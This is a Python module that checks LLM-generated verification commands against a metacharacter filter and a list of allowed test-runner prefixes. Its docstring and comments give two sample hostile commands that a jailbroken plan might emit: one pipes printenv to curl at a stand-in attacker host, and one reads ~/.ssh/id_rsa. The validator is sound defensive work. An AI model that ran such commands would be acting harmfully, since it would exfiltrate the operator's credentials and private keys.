"""Shell-command safety helpers for verify_cmd validation.

verify_cmd values are LLM-generated and persisted to ``task_plans.verify_cmd``;
the executor and verifier later run them. Without runtime validation, a
jailbroken plan can emit ``pytest tests/ ; printenv | curl attacker`` and
exfiltrate credentials inherited from the parent process.

This module is the gate. Two layers of defence:

  1. ``validate_verify_cmd(cmd)`` rejects any string with shell metacharacters
     or that doesn't start with a known-safe prefix.
  2. The executor pairs that with ``subprocess_exec(*shlex.split(cmd))`` (no
     ``shell=True``), so even if a future regression weakens validation, the
     blast radius is bounded by argv parsing rather than arbitrary shell.
"""

from __future__ import annotations

import re
import shlex

# Tilde (~) is rejected because most shells expand ``~/path`` to the
# operator's home directory before argv is built. A jailbroken plan
# emitting ``pytest tests/ ~/.ssh/id_rsa`` would read private keys via
# a "test runner" verify_cmd. validate_verify_cmd is the only gate;
# subprocess_exec uses ``shlex.split`` which does NOT expand ~, but we
# refuse the input anyway as defense in depth and to keep the failure
# mode obvious in plan reviews.
_FORBIDDEN = re.compile(r"[;&|`$<>~\n\r]|\$\(|\$\{|>>|<<")

_ALLOWED_PREFIXES: tuple[str, ...] = (
    "pytest",
    "uv run pytest",
    "python -m pytest",
    "python3 -m pytest",
    "npm test",
    "npm run test",
    "cargo test",
    "go test",
    "alembic upgrade head",
    "alembic check",
)


def validate_verify_cmd(cmd: str | None) -> tuple[bool, str | None]:
    """Return ``(ok, reason_if_not)`` for a candidate verify_cmd.

    Empty / whitespace-only is valid (means "use conversational verify").
    """
    if cmd is None or not cmd.strip():
        return True, None

    if _FORBIDDEN.search(cmd):
        return False, ("verify_cmd contains shell metacharacters (one of: ; & | ` $ < > ~ newline)")

    stripped = cmd.strip()
    if not any(stripped == p or stripped.startswith(p + " ") for p in _ALLOWED_PREFIXES):
        return False, (
            "verify_cmd must start with a known-safe prefix: " + ", ".join(_ALLOWED_PREFIXES)
        )

    try:
        shlex.split(cmd)
    except ValueError as e:
        return False, f"verify_cmd has unbalanced quotes: {e}"

    return True, None


def split_verify_cmd(cmd: str) -> list[str]:
    """``shlex.split`` wrapper. Caller MUST have already validated ``cmd``."""
    return shlex.split(cmd)
